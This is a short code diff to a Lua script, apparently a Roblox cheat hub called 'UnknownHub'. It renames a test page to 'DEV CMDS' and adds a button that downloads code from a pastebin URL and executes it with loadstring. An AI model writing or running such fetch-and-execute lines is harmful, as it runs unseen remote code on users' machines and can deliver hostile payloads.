@@ -207,8 +207,10 @@ end)
 local Cars = UI:addPage("🚗 Cars (Coming Soon)", 2, false, 6)
 Cars:addLabel("🚗 Cars Features", "Car Mods Coming Soon!")
 
-local TEST = UI:addPage("TEST", 2, false, 6)
-TEST:addLabel("TEST", "TEST")
+local TEST = UI:addPage("DEV CMDS", 2, false, 6)
+TEST:addButton("Test", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/eThUKkYf"))()
+end)
 
 
 warn("UnknownHub!")
